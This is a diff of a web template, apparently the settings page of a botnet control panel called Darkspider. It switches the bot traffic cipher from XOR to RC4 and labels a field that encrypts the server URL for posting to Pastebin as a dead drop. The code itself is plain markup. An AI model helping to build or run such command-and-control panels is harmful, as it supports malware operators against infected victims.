@@ -112,12 +112,12 @@
                         <input type="text" class="form-control" name="updateinfo" value="{$config.check_update_url}" id="updateinfo" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
                         <small id="updateinfoHelper" class="form-text text-muted">Check New versions from Darkspider.</small>
                     </div>
-                    <!--  <div class="form-group">
+                      <div class="form-group">
                             <label for="enryptionkey">Enryption Key</label>
                             <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
-                            <small id="enryptionkeyHelper" class="form-text text-muted">We'll never share your encryption key with anyone else. (This is the XOR Cipher Private Key)</small>
+                            <small id="enryptionkeyHelper" class="form-text text-muted">We'll never share your encryption key with anyone else. (This is the RC4 Cipher Private Key)</small>
                         </div>
-                        <div class="form-group">
+                     <!--   <div class="form-group">
                             <label for="useragent">User Agent</label>
                             <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
                             <small id="useragentHelper" class="form-text text-muted">The Bot and the Gate need the same HTTP User Agent.</small>
@@ -158,7 +158,7 @@
                         <a  class="btn btn-primary"  href="/settings">Reload</a>
                     {else}
                         <div class="form-group">
-                            <label for="encrypt">Encrypt & Decrypt XOR Cipher</label>
+                            <label for="encrypt">Encrypt RC4 Cipher</label>
                             <input type="text" class="form-control" name="encrypt"  id="encrypt" aria-describedby="emailHelp" placeholder="By Default: http://0.0.0.0/request">
                             <small id="encryptHelper" class="form-text text-muted">Encrypt your current Server URL before create a Pastebin with it. (0.0.0.0 is your IP)</small>
                         </div>
